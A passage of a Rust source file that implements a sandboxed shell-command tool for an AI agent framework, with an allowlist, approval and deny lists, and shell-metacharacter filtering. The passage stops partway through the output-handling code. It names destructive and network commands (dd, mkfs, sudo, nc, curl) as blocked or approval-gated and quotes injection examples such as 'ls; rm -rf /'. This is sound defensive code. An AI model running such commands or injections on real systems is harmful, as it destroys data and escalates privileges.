/*!
 * Shell 命令执行工具
 *
 * 安全策略：仅允许白名单中的安全命令，使用直接 argv 执行（拒绝 shell 注入）
 */

use echo_core::error::{Result, ToolError};
use echo_core::sandbox::{
    SandboxCommand, SandboxExecutor, SandboxOutputChannel, SandboxStreamEvent,
};
use echo_core::tools::artifact::{
    ToolOutputArtifactIdentity, ToolOutputArtifactRef, ToolOutputArtifactWriter,
};
use echo_core::tools::cell::{
    CommandCellError, CommandCellOwner, CommandCellRegistry, CommandCellRequest,
};
use echo_core::tools::permission::ToolPermission;
use echo_core::tools::{
    CommandPolicy, CommandPolicyDecision, Tool, ToolContext, ToolFailure, ToolFailureCategory,
    ToolOutputChannel, ToolParameters, ToolResult, ToolResultKind, ToolRiskLevel, ToolSideEffect,
    ToolStreamEvent,
};
use echo_core::utils::utf8::{IncrementalUtf8Decoder, split_utf8_chunks};
use futures::future::BoxFuture;
use futures::{Stream, StreamExt};
use serde_json::Value;
use shlex::split as shlex_split;
use std::collections::HashSet;
use std::pin::Pin;
use std::process::Stdio;
use std::sync::{Arc, LazyLock, Mutex};
use std::time::{Duration, Instant};
use tokio::io::AsyncReadExt;
use tokio::process::Command;
use tokio::sync::mpsc;

/// 每次流式输出分块的最大字节数
const STREAM_CHUNK_BYTES: usize = 16 * 1024;
/// 内存中保留的 stdout+stderr 输出上限（字节）
const MAX_RETAINED_OUTPUT_BYTES: usize = 1024 * 1024;
/// 流式事件通道的容量
const STREAM_CHANNEL_CAPACITY: usize = 32;

/// 严格模式下允许直接执行的安全命令白名单
static ALLOWED_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== 文件查看 =====
        "ls", "cat", "head", "tail", "less", "more", "file", "stat", "wc",
        // ===== 目录操作（只读） =====
        "pwd", "tree", "find", "du", // ===== 代码相关 =====
        "git", "cargo", "rustc", "clippy", "rustfmt", // ===== 搜索与查找 =====
        "grep", "rg", "ag", "fd", // ===== 文本处理（只读） =====
        "echo", "printf", "cut", "sort", "uniq", "diff",
        // ===== 系统信息（只读） =====
        "which", "whereis", "env", "date", "uname",
    ])
});

/// 需要人工确认后才能执行的命令集合
static REQUIRE_APPROVAL_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== 文件删除/修改（需要确认） =====
        "rm", "rmdir", "mv", "cp", // ===== 网络操作（需要确认） =====
        "curl", "wget", "nc", // ===== 进程操作（需要确认） =====
        "kill", "killall", "pkill", // ===== 包管理（需要确认） =====
        "apt", "apt-get", "yum", "dnf", "brew", "pip", "pip3", "npm", "yarn", "pnpm",
        // ===== 脚本执行（需要确认） =====
        "bash", "sh", "zsh", "fish", "python", "python3", "node", "perl", "ruby", "php",
        // ===== 文本处理（可能修改文件） =====
        "sed", "awk",
    ])
});

/// 危险命令黑名单（始终拒绝，即使配置了沙箱）
static DANGEROUS_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // ===== 极度危险（数据破坏） =====
        "dd", "shred", "mkfs", "fdisk", // ===== 权限提升 =====
        "sudo", "su", // ===== 权限修改 =====
        "chmod", "chown", "chgrp", // ===== 系统操作 =====
        "reboot", "shutdown", "halt", "poweroff", "init",
        // ===== 高风险网络操作 =====
        "nmap",
    ])
});

/// 已知的 git 子命令集合（部分仍需确认）
static GIT_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // 只读操作
        "status", "log", "show", "diff", "branch", "tag", "ls-files", "ls-tree", "remote", "config",
        // 需要用户确认的修改操作
        "add", "commit", "checkout", "switch", "stash",
    ])
});

/// 已知的 cargo 子命令集合（部分仍需确认）
static CARGO_SAFE_SUBCOMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        // 只读 / 构建操作
        "check", "build", "test", "clippy", "fmt", "tree", "search", "metadata",
        // 需要确认
        "clean", "update",
    ])
});

/**
 * Shell 元字符列表（用于拒绝 shell 语法、防止注入）
 *
 * 这些字符在 `sh -c` 中具有特殊含义。本工具使用直接 argv 执行，
 * 因此除非配置了沙箱，否则包含这些字符的命令会被拒绝。
 */
const SHELL_METACHARACTERS: &[char] = &[
    '|',  // 管道
    ';',  // 命令分隔符
    '&',  // 后台/条件执行
    '$',  // 变量/命令替换
    '`',  // 反引号命令替换
    '>',  // 输出重定向
    '<',  // 输入重定向
    '(',  // 子 shell
    ')',  // 子 shell
    '\n', // 换行注入
];

/// 在沙箱内运行是安全的命令（由沙箱提供隔离）
static SANDBOX_SAFE_COMMANDS: LazyLock<HashSet<&'static str>> = LazyLock::new(|| {
    HashSet::from([
        "bash", "sh", "zsh", "fish", "python", "python3", "node", "perl", "ruby", "php", "pip",
        "pip3", "npm", "yarn", "pnpm", "sed", "awk",
    ])
});

/// 命令安全检查结果
pub type CommandSafety = CommandPolicyDecision;

/// [`ShellTool`] 使用的默认命令策略。
#[derive(Debug, Clone, Copy)]
pub struct StandardCommandPolicy {
    /// 是否启用严格白名单模式
    strict: bool,
    /// 是否按"已配置沙箱"进行评估
    sandboxed: bool,
}

impl StandardCommandPolicy {
    /// 创建严格模式策略（仅允许白名单命令，不视为沙箱环境）
    pub fn strict() -> Self {
        Self {
            strict: true,
            sandboxed: false,
        }
    }

    /// 创建宽松模式策略（不强制白名单，不视为沙箱环境）
    pub fn permissive() -> Self {
        Self {
            strict: false,
            sandboxed: false,
        }
    }

    /// 设置是否按沙箱环境评估命令
    pub fn with_sandbox(mut self, sandboxed: bool) -> Self {
        self.sandboxed = sandboxed;
        self
    }
}

impl CommandPolicy for StandardCommandPolicy {
    /// 按当前严格/沙箱配置评估命令安全性
    fn evaluate(&self, command: &str) -> CommandPolicyDecision {
        ShellTool::for_policy_evaluation(self.strict, self.sandboxed).check_command_safety(command)
    }
}

/**
 * 使用严格的默认安全策略校验 shell 命令。
 *
 * 这是框架内所有 shell 执行路径共用的标准安全闸门（同步的 `ShellTool`
 * 以及 `spawn_background_task` 等异步/后台启动器）。它使用默认严格模式的
 * `ShellTool`（无沙箱、严格白名单），因此会拒绝 shell 元字符、危险命令
 * 以及不在白名单中的程序。
 *
 * 执行来自 LLM（或任何不可信来源）命令的调用方，**必须**在启动进程前
 * 调用此函数，并遵守返回的 [`CommandSafety`] 判定。
 */
pub fn validate_command_safety(command: &str) -> CommandSafety {
    StandardCommandPolicy::strict().evaluate(command)
}

/**
 * Shell 命令执行工具（带安全检查）
 *
 * 可选的沙箱执行器集成：设置 `sandbox` 后，所有命令都通过沙箱执行，
 * 以提供额外的隔离与资源限制。
 *
 * 可选的后台模式：通过 [`ShellTool::with_cell_launcher`] 配置
 * [`CommandCellRegistry`] 后，`background=true` 会将命令作为 cell 启动，
 * 并立即返回 `cell_id`。
 */
pub struct ShellTool {
    /// 是否启用严格模式（默认 true）
    strict_mode: bool,
    /// 应用自定义的命令策略；设置后替代内置分类器
    command_policy: Option<Arc<dyn CommandPolicy>>,
    /// 策略评估时是否视为已配置沙箱
    policy_sandboxed: bool,
    /**
     * 可选的沙箱执行器（内部可变，以便 `Tool::set_sandbox` 在构造后
     * 通过 `ToolManager::apply_sandbox` 注入）。
     */
    sandbox: Mutex<Option<Arc<dyn SandboxExecutor>>>,
    /**
     * 用于 `background=true` 启动的可选命令 cell 注册表。
     * `None`（默认）表示后台模式不可用。
     */
    cell_launcher: Option<Arc<dyn CommandCellRegistry>>,
    /// 命令超时时间，单位秒（默认 60 秒）
    timeout_secs: u64,
}

impl Default for ShellTool {
    /// 等价于 [`ShellTool::new`]
    fn default() -> Self {
        Self::new()
    }
}

impl ShellTool {
    /// 创建新的 Shell 工具（默认严格模式，60 秒超时）
    pub fn new() -> Self {
        Self {
            strict_mode: true,
            command_policy: None,
            policy_sandboxed: false,
            sandbox: Mutex::new(None),
            cell_launcher: None,
            timeout_secs: 60,
        }
    }

    /// 创建非严格模式的 Shell 工具（不推荐！）
    pub fn new_permissive() -> Self {
        Self {
            strict_mode: false,
            command_policy: None,
            policy_sandboxed: false,
            sandbox: Mutex::new(None),
            cell_launcher: None,
            timeout_secs: 60,
        }
    }

    /// 构造仅用于策略评估的实例
    fn for_policy_evaluation(strict_mode: bool, policy_sandboxed: bool) -> Self {
        Self {
            strict_mode,
            command_policy: None,
            policy_sandboxed,
            sandbox: Mutex::new(None),
            cell_launcher: None,
            timeout_secs: 60,
        }
    }

    /// 使用应用提供的策略替换默认分类器。
    pub fn with_command_policy(mut self, policy: Arc<dyn CommandPolicy>) -> Self {
        self.command_policy = Some(policy);
        self
    }

    /// 设置沙箱执行器；命令将通过沙箱执行
    pub fn with_sandbox(self, sandbox: Arc<dyn SandboxExecutor>) -> Self {
        *self
            .sandbox
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(sandbox);
        self
    }

    /**
     * 设置 `background=true` 启动所使用的命令 cell 注册表。
     * （普通字段赋值——注册表在初始化时一次性注入，不同于内部可变的
     * `sandbox` Mutex，后者由 `Tool::set_sandbox` 稍后填充。）
     */
    pub fn with_cell_launcher(mut self, cells: Arc<dyn CommandCellRegistry>) -> Self {
        self.cell_launcher = Some(cells);
        self
    }

    /// 设置命令超时时间，单位秒（默认 60 秒）
    pub fn with_timeout(mut self, timeout_secs: u64) -> Self {
        self.timeout_secs = timeout_secs;
        self
    }

    /**
     * 检查命令是否包含 shell 元字符
     *
     * 注意：引号内的元字符是安全的（会作为字面参数传递），
     * 但本工具采取保守策略，发现任何元字符都拒绝。
     * 这可以防止 `ls; rm -rf /` 或 `echo $(id)` 之类的注入攻击。
     */
    fn has_shell_metacharacters(&self, cmd: &str) -> bool {
        cmd.contains(SHELL_METACHARACTERS)
    }

    /**
     * 将命令作为后台 cell 启动（Codex 风格的 `background=true`）。
     *
     * 闸门顺序（与前台策略一致）：
     * 1. 没有 cell 注册表 → 拒绝；
     * 2. 使用与前台路径相同的 `check_command_safety` 分类器
     *    （Safe 继续；RequiresApproval/Dangerous 返回相同的错误）；
     * 3. 通过注册表启动并立即返回 `cell_id`。
     *
     * `require_sandbox` 随请求一同传递。缺少对应执行器的注册表必须拒绝，
     * 而不是静默降级。
     */
    async fn launch_background_cell(
        &self,
        command: &str,
        ctx: &ToolContext,
        timeout_secs: Option<u64>,
        has_sandbox: bool,
    ) -> ToolResult {
        let Some(launcher) = self.cell_launcher.clone() else {
            return ToolResult::error("background mode requires a command cell registry");
        };
        // 与前台完全相同的安全校验路径。
        match self.check_command_safety(command) {
            CommandSafety::Safe => {}
            CommandSafety::RequiresApproval(reason) => {
                return ToolResult::failure(
                    ToolFailureCategory::Permanent,
                    format!(
                        "⚠️  Manual confirmation required: {}\nCommand: {}\n\nPlease use the human_loop module to confirm before executing.",
                        reason, command
                    ),
                );
            }
            CommandSafety::Dangerous(reason) => {
                return ToolResult::failure(
                    ToolFailureCategory::Permanent,
                    format!(
                        "🚫 Safety rejection: {}\nCommand: {}\n\nTo perform this operation, please execute it manually in the terminal.",
                        reason, command
                    ),
                );
            }
        }

        let request = CommandCellRequest {
            command: command.to_string(),
            working_dir: ctx
                .working_dir
                .as_ref()
                .map(|dir| dir.display().to_string()),
            timeout_secs,
            require_sandbox: has_sandbox,
            /*
             * 后台 cell 的生命周期长于前台 Turn。区分暂停与取消的产品运行时
             * 会按 run 身份显式停止其拥有的 cell，而不是在此继承 Turn 的取消令牌。
             */
            cancel: None,
            owner: CommandCellOwner {
                conversation_id: ctx.conversation_id.clone(),
                run_id: ctx.run_id.clone(),
                turn_id: ctx.turn_id.clone(),
                message_id: ctx.message_id.clone(),
                execution_id: ctx.execution_id.clone(),
                call_id: ctx.call_id.clone(),
            },
            output_artifacts: ctx.output_artifacts.clone(),
            artifact_identity: ctx
                .output_artifacts
                .as_ref()
                .map(|_| ToolOutputArtifactIdentity::from_context(ctx, self.name())),
        };
        match launcher.launch(request).await {
            Ok(receipt) => {
                let payload = serde_json::json!({
                    "cell_id": receipt.cell_id,
                    "status": "queued",
                    "accepted_at": receipt.accepted_at,
                    "deadline": receipt.deadline,
                    "hint": "call wait(cell_id, cursor=0, yield_time_ms=30000) to await output; re-pass the returned next_cursor"
                });
                ToolResult::success_json(payload)
            }
            Err(error) => {
                let category = match error {
                    CommandCellError::Validation { .. }
                    | CommandCellError::DuplicateIdentity { .. } => {
                        ToolFailureCategory::InvalidArguments
                    }
                    CommandCellError::CapacityDeadline => ToolFailureCategory::Timeout,
                    CommandCellError::Cancelled => ToolFailureCategory::Cancelled,
                    CommandCellError::Shutdown | CommandCellError::NotFound { .. } => {
                        ToolFailureCategory::Unavailable
                    }
                    CommandCellError::Runtime { .. } => ToolFailureCategory::Transient,
                };
                ToolResult::failure(
                    category,
                    format!("Failed to launch background cell: {error}"),
                )
            }
        }
    }

    /// 检查命令是否安全
    pub fn check_command_safety(&self, command: &str) -> CommandSafety {
        if let Some(policy) = &self.command_policy {
            return policy.evaluate(command);
        }
        let has_sandbox = self
            .sandbox
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .is_some()
            || self.policy_sandboxed;

        /* 检查 shell 元字符（防止注入）
         * 当沙箱可用时允许元字符——由沙箱提供隔离 */
        if self.has_shell_metacharacters(command) && !has_sandbox {
            return CommandSafety::Dangerous(format!(
                "Command contains shell metacharacters (| ; & $ ` > < () etc.), execution rejected.\
                 \nThis tool only supports simple commands (program + args), not pipes, redirects, command substitution, or other shell syntax.\
                 \nTip: enable a sandbox to allow shell syntax.\
                 \nCommand: {}",
                command
            ));
        }

        let parts = match shlex_split(command) {
            Some(parts) => parts,
            None => {
                // 若沙箱可用，允许无法解析的命令（将使用 sh -c 执行）
                if has_sandbox {
                    return CommandSafety::Safe;
                }
                return CommandSafety::Dangerous(format!(
                    "Command parsing failed, possibly unclosed quotes or malformed arguments: {}",
                    command
                ));
            }
        };
        if parts.is_empty() {
            return CommandSafety::Dangerous("Empty command".to_string());
        }

        let base_cmd = parts[0].as_str();

        // 1. 检查是否在危险命令黑名单中（始终强制执行，即使有沙箱）
        if DANGEROUS_COMMANDS.contains(base_cmd) {
            return CommandSafety::Dangerous(format!(
                "Command '{}' is in the dangerous command blocklist, execution rejected",
                base_cmd
            ));
        }

        // 2. 沙箱模式：SANDBOX_SAFE_COMMANDS 中的命令无需审批即可执行
        if has_sandbox && SANDBOX_SAFE_COMMANDS.contains(base_cmd) {
            return CommandSafety::Safe;
        }

        // 3. 检查是否需要人工确认
        if REQUIRE_APPROVAL_COMMANDS.contains(base_cmd) {
            return CommandSafety::RequiresApproval(format!(
                "Command '{}' may cause system changes, requires manual confirmation",
                base_cmd
            ));
        }

        // 4. 严格模式：必须在白名单中
        if self.strict_mode && !ALLOWED_COMMANDS.contains(base_cmd) {
            return CommandSafety::Dangerous(format!(
                "Command '{}' is not in the safe whitelist, execution rejected",
                base_cmd
            ));
        }

        // 5. 对特殊命令进行子命令检查
        match base_cmd {
            "git" => self.check_git_command(&parts),
            "cargo" => self.check_cargo_command(&parts),
            _ => CommandSafety::Safe,
        }
    }

    /// 检查 git 子命令
    fn check_git_command(&self, parts: &[String]) -> CommandSafety {
        if parts.len() < 2 {
            return CommandSafety::Safe;
        }

        let subcommand = parts[1].as_str();

        // 检查 git 操作
        match subcommand {
            // 网络操作（需要确认）
            "push" | "pull" | "fetch" | "clone" => CommandSafety::RequiresApproval(format!(
                "git {} involves network operations, requires confirmation",
                subcommand
            )),
            // 强制重置（危险，拒绝）
            "reset" => {
                if parts.iter().any(|part| part == "--hard") {
                    CommandSafety::Dangerous(
                        "git reset --hard will lose data, rejected. Please execute manually if needed".to_string(),
                    )
                } else {
                    CommandSafety::RequiresApproval(
                        "git reset will modify Git state, requires confirmation".to_string(),
                    )
                }
            }
            // 清理未跟踪文件（需要确认）
            "clean" => CommandSafety::RequiresApproval(
                "git clean will delete untracked files, requires confirmation".to_string(),
            ),
            // 安全子命令
            cmd if GIT_SAFE_SUBCOMMANDS.contains(cmd) => {
                if cmd == "commit" || cmd == "add" || cmd == "checkout" {
                    CommandSafety::RequiresApproval(format!(
                        "git {} will modify the repository, requires confirmation",
                        cmd
                    ))
                } else {
                    CommandSafety::Safe
                }
            }
            // 未知子命令（需要确认）
            _ => CommandSafety::RequiresApproval(format!(
                "git {} is not in the known safe list, requires confirmation",
                subcommand
            )),
        }
    }

    /// 检查 cargo 子命令
    fn check_cargo_command(&self, parts: &[String]) -> CommandSafety {
        if parts.len() < 2 {
            return CommandSafety::Safe;
        }

        let subcommand = parts[1].as_str();

        match subcommand {
            // 包安装/发布（需要确认）
            "install" | "uninstall" | "publish" => CommandSafety::RequiresApproval(format!(
                "cargo {} involves package installation/publishing, requires confirmation",
                subcommand
            )),
            // 运行程序（需要确认）
            "run" => CommandSafety::RequiresApproval(
                "cargo run will execute a program, requires confirmation".to_string(),
            ),
            // 已知的安全命令
            cmd if CARGO_SAFE_SUBCOMMANDS.contains(cmd) => {
                if cmd == "clean" || cmd == "update" {
                    CommandSafety::RequiresApproval(format!(
                        "cargo {} will modify the project, requires confirmation",
                        cmd
                    ))
                } else {
                    CommandSafety::Safe
                }
            }
            // 未知子命令（需要确认）
            _ => CommandSafety::RequiresApproval(format!(
                "cargo {} is not in the known safe list, requires confirmation",
                subcommand
            )),
        }
    }
}

impl Tool for ShellTool {
    /// 返回工具名称 `shell`
    fn name(&self) -> &str {
        "shell"
    }

    /// 返回面向模型的工具描述
    fn description(&self) -> &str {
        "Execute restricted shell commands (only safe read-only operations and code-related commands are allowed). Parameter: command - the command to execute. Note: only simple commands (program + args) are supported; pipes, redirects, command substitution, and other shell syntax are not allowed."
    }

    /// 声明工具需要执行权限
    fn permissions(&self) -> Vec<ToolPermission> {
        vec![ToolPermission::Execute]
    }

    /// 声明工具风险等级为危险
    fn risk_level(&self) -> ToolRiskLevel {
        ToolRiskLevel::Dangerous
    }

    /// P2：在 agent 初始化时接收沙箱（通过 ToolManager::apply_sandbox）。
    fn set_sandbox(&self, sandbox: Arc<dyn SandboxExecutor>) -> bool {
        *self
            .sandbox
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(sandbox);
        true
    }

    /// 返回工具参数的 JSON Schema
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute (only safe commands in the whitelist; shell syntax like pipes/redirects/command substitution is not supported)"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Command timeout in seconds (foreground default: 60, max: 300; background uses the cell runtime limit)"
                },
                "background": {
                    "type": "boolean",
                    "description": "Run in background and return a cell_id immediately. Use wait(cell_id, yield_time_ms) to long-poll for output/exit status."
                }
            },
            "required": ["command"]
        })
    }

    /// 执行命令并等待流中的完成事件作为最终结果
    fn execute_with_context<'a>(
        &'a self,
        parameters: ToolParameters,
        ctx: &'a ToolContext,
    ) -> BoxFuture<'a, Result<ToolResult>> {
        Box::pin(async move {
            let mut stream = self.execute_stream_with_context(parameters, ctx).await?;
            while let Some(event) = stream.next().await {
                if let ToolStreamEvent::Complete(result) = event {
                    return Ok(result);
                }
            }
            Ok(ToolResult::failure(
                ToolFailureCategory::Permanent,
                "Shell execution stream ended without a completion event",
            ))
        })
    }

    /// 执行命令并返回实时输出事件流（支持后台模式、沙箱与直接执行）
    fn execute_stream_with_context<'a>(
        &'a self,
        parameters: ToolParameters,
        ctx: &ToolContext,
    ) -> BoxFuture<'a, Result<Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>>>> {
        let ctx = ctx.clone();
        Box::pin(async move {
            let sandbox = self
                .sandbox
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner())
                .clone();
            let command = parameters
                .get("command")
                .and_then(|v| v.as_str())
                .ok_or_else(|| ToolError::MissingParameter("command".to_string()))?;

            /*
             * 提取超时参数（默认 60 秒）。后台路径会把显式超时映射为 cell 的
             * 生命周期，且不受前台 300 秒上限约束（cell 的意义正是支持小时级构建）。
             */
            let has_timeout_param = parameters.contains_key("timeout");
            let timeout_secs_raw = parameters
                .get("timeout")
                .and_then(|v| v.as_u64())
                .unwrap_or(self.timeout_secs);

            // ── 后台模式：启动 cell 并立即返回 ──
            let background = parameters
                .get("background")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if background {
                let result = self
                    .launch_background_cell(
                        command,
                        &ctx,
                        if has_timeout_param {
                            Some(timeout_secs_raw)
                        } else {
                            None
                        },
                        sandbox.is_some(),
                    )
                    .await;
                return Ok(single_complete_stream(result));
            }

            /*
            ── 前台路径（保持不变） ─────────────────────────
            上限为 300 秒
            */
            let timeout_secs = timeout_secs_raw.min(300);

            match self.check_command_safety(command) {
                CommandSafety::Safe => {}
                CommandSafety::RequiresApproval(reason) => {
                    return Ok(single_complete_stream(ToolResult::failure(
                        ToolFailureCategory::Permanent,
                        format!(
                            "⚠️  Manual confirmation required: {}\nCommand: {}\n\nPlease use the human_loop module to confirm before executing.",
                            reason, command
                        ),
                    )));
                }
                CommandSafety::Dangerous(reason) => {
                    return Ok(single_complete_stream(ToolResult::failure(
                        ToolFailureCategory::Permanent,
                        format!(
                            "🚫 Safety rejection: {}\nCommand: {}\n\nTo perform this operation, please execute it manually in the terminal.",
                            reason, command
                        ),
                    )));
                }
            }

            let has_metacharacters = self.has_shell_metacharacters(command);
            let working_dir = ctx
                .working_dir
                .clone()
                .or_else(|| std::env::current_dir().ok());
            let timeout = Duration::from_secs(timeout_secs);
            let artifact_capture = ArtifactCapture::new(&ctx, self.name());

            if let Some(sandbox) = sandbox {
                let mut sandbox_cmd = if has_metacharacters {
                    SandboxCommand::program("sh", vec!["-c".to_string(), command.to_string()])
                } else {
                    let parts = parse_command(self.name(), command)?;
                    let Some(program) = parts.first() else {
                        return Err(ToolError::ExecutionFailed {
                            tool: self.name().to_string(),
                            message: "Command is empty".to_string(),
                        }
                        .into());
                    };
                    SandboxCommand::program(program, parts.get(1..).unwrap_or_default().to_vec())
                };
                sandbox_cmd.timeout = timeout;
                if let Some(dir) = &working_dir {
                    sandbox_cmd = sandbox_cmd.with_working_dir(dir);
                }
                Ok(start_sandbox_stream(
                    sandbox,
                    sandbox_cmd,
                    working_dir,
                    artifact_capture,
                ))
            } else {
                let parts = parse_command(self.name(), command)?;
                let Some(program) = parts.first() else {
                    return Err(ToolError::ExecutionFailed {
                        tool: self.name().to_string(),
                        message: "Command is empty".to_string(),
                    }
                    .into());
                };
                start_direct_stream(
                    program,
                    parts.get(1..).unwrap_or_default(),
                    working_dir,
                    timeout,
                    artifact_capture,
                )
            }
        })
    }

    /// 声明支持实时流式输出
    fn supports_streaming(&self) -> bool {
        true
    }
}

/// 使用 shlex 将命令字符串解析为 argv 列表
fn parse_command(tool_name: &str, command: &str) -> Result<Vec<String>> {
    shlex_split(command).ok_or_else(|| {
        ToolError::ExecutionFailed {
            tool: tool_name.to_string(),
            message:
                "Command parsing failed, possibly unclosed quotes or malformed argument format"
                    .to_string(),
        }
        .into()
    })
}

/// 构造只包含一个完成事件的流
fn single_complete_stream<'a>(
    result: ToolResult,
) -> Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>> {
    Box::pin(futures::stream::once(async move {
        ToolStreamEvent::Complete(result)
    }))
}

/// 将 mpsc 接收端包装为工具流事件流
fn receiver_stream<'a>(
    receiver: mpsc::Receiver<ToolStreamEvent>,
) -> Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>> {
    Box::pin(futures::stream::unfold(
        receiver,
        |mut receiver| async move { receiver.recv().await.map(|event| (event, receiver)) },
    ))
}

/// 直接（非沙箱）启动子进程，并返回其输出事件流
fn start_direct_stream<'a>(
    program: &str,
    args: &[String],
    working_dir: Option<std::path::PathBuf>,
    timeout: Duration,
    artifact_capture: ArtifactCapture,
) -> Result<Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>>> {
    let mut command = Command::new(program);
    command
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    #[cfg(unix)]
    command.process_group(0);
    if let Some(dir) = &working_dir {
        command.current_dir(dir);
    }

    let mut child = command
        .spawn()
        .map_err(|error| ToolError::ExecutionFailed {
            tool: "shell".to_string(),
            message: format!("Unable to execute command: {error}"),
        })?;
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    let (tx, rx) = mpsc::channel(STREAM_CHANNEL_CAPACITY);
    tokio::spawn(async move {
        run_direct_child(
            &mut child,
            stdout,
            stderr,
            tx,
            working_dir,
            timeout,
            artifact_capture,
        )
        .await;
    });
    Ok(receiver_stream(rx))
}

/// 通过沙箱执行命令，并将沙箱事件映射为工具流事件
fn start_sandbox_stream<'a>(
    sandbox: Arc<dyn SandboxExecutor>,
    command: SandboxCommand,
    working_dir: Option<std::path::PathBuf>,
    mut artifact_capture: ArtifactCapture,
) -> Pin<Box<dyn Stream<Item = ToolStreamEvent> + Send + 'a>> {
    let (tx, rx) = mpsc::channel(STREAM_CHANNEL_CAPACITY);
    tokio::spawn(async move {
        let stream = tokio::select! {
            _ = tx.closed() => return,
            stream = sandbox.execute_stream(command) => stream,
        };
        let Ok(mut stream) = stream else {
            let message = stream
                .err()
                .map(|error| format!("Sandbox execution failed: {error}"))
                .unwrap_or_else(|| "Sandbox execution failed".to_string());
            let result = ToolResult::failure(ToolFailureCategory::Unavailable, message)
                .with_meta("duration_ms", "0")
                .with_meta("exit_code", "-1")
                .with_meta(
                    "working_dir",
                    working_dir
                        .as_ref()
                        .map(|dir| dir.display().to_string())
                        .unwrap_or_default(),
                )
                .with_meta("output_truncated", "false")
                .with_meta("stdout_bytes", "0")
                .with_meta("stderr_bytes", "0");
            let _ = tx.send(ToolStreamEvent::Complete(result)).await;
            return;
        };

        loop {
            let event = tokio::select! {
                _ = tx.closed() => return,
                event = stream.next() => event,
            };
            let Some(event) = event else {
                return;
            };
            let mapped = match event {
                SandboxStreamEvent::Output { channel, chunk } => {
                    let tool_channel = match channel {
                        SandboxOutputChannel::Stdout => ToolOutputChannel::Stdout,
                        SandboxOutputChannel::Stderr => ToolOutputChannel::Stderr,
                    };
                    artifact_capture.push(tool_channel, &chunk);
                    ToolStreamEvent::Output {
                        channel: tool_channel,
                        chunk,
                    }
                }
                SandboxStreamEvent::Complete(result) => {
                    let result = tool_result_from_execution(result, working_dir.as_ref());
                    ToolStreamEvent::Complete(artifact_capture.finish(result))
                }
                SandboxStreamEvent::Failed { failure } => {
                    let category = if failure.is_cancelled() {
                        ToolFailureCategory::Cancelled
                    } else {
                        ToolFailureCategory::Permanent
                    };
                    let result = ToolResult::failure(category, failure.message())
                        .with_meta("duration_ms", "0")
                        .with_meta("exit_code", "-1")
                        .with_meta(
                            "working_dir",
                            working_dir
                                .as_ref()
                                .map(|dir| dir.display().to_string())
                                .unwrap_or_default(),
                        )
                        .with_meta("output_truncated", "false")
                        .with_meta("stdout_bytes", "0")
                        .with_meta("stderr_bytes", "0");
                    ToolStreamEvent::Complete(artifact_capture.finish(result))
                }
            };
            if tx.send(mapped).await.is_err() {
                return;
            }
        }
    });
    receiver_stream(rx)
}

/// 驱动直接子进程：读取 stdout/stderr、处理超时与取消，并在结束时发送完成事件
async fn run_direct_child(
    child: &mut tokio::process::Child,
    mut stdout: Option<tokio::process::ChildStdout>,
    mut stderr: Option<tokio::process::ChildStderr>,
    tx: mpsc::Sender<ToolStreamEvent>,
    working_dir: Option<std::path::PathBuf>,
    timeout: Duration,
    mut artifact_capture: ArtifactCapture,
) {
    let start = Instant::now();
    let deadline = tokio::time::sleep(timeout);
    tokio::pin!(deadline);
    let mut stdout_buffer = [0_u8; STREAM_CHUNK_BYTES];
    let mut stderr_buffer = [0_u8; STREAM_CHUNK_BYTES];
    let mut stdout_decoder = IncrementalUtf8Decoder::default();
    let mut stderr_decoder = IncrementalUtf8Decoder::default();
    let mut retained_stdout = RetainedOutput::default();
    let mut retained_stderr = RetainedOutput::default();
    let mut status = None;

    loop {
        if stdout.is_none() && stderr.is_none() && status.is_some() {
            break;
        }

        tokio::select! {
            _ = tx.closed() => {
                cleanup_direct_child(child).await;
                return;
            }
            _ = &mut deadline => {
                cleanup_direct_child(child).await;
                let result = artifact_capture.finish(build_tool_result(
                    -1,
                    retained_stdout,
                    retained_stderr,
                    start.elapsed(),
                    working_dir.as_ref(),
                    true,
                ));
                let _ = tx.send(ToolStreamEvent::Complete(result)).await;
                return;
            }
            read = async {
                match stdout.as_mut() {
                    Some(pipe) => pipe.read(&mut stdout_buffer).await,
                    None => Ok(0),
                }
            }, if stdout.is_some() => {
                match read {
                    Ok(0) => {
                        stdout = None;
                        if let Some(chunk) = stdout_decoder.finish() {
                            artifact_capture.push(ToolOutputChannel::Stdout, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stdout, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Ok(count) => {
                        let bytes = stdout_buffer.get(..count).unwrap_or_default();
                        let retained = retained_stdout
                            .bytes
                            .len()
                            .saturating_add(retained_stderr.bytes.len());
                        retained_stdout.push(bytes, MAX_RETAINED_OUTPUT_BYTES.saturating_sub(retained));
                        for chunk in stdout_decoder.push(bytes) {
                            artifact_capture.push(ToolOutputChannel::Stdout, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stdout, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Err(_) => stdout = None,
                }
            }
            read = async {
                match stderr.as_mut() {
                    Some(pipe) => pipe.read(&mut stderr_buffer).await,
                    None => Ok(0),
                }
            }, if stderr.is_some() => {
                match read {
                    Ok(0) => {
                        stderr = None;
                        if let Some(chunk) = stderr_decoder.finish() {
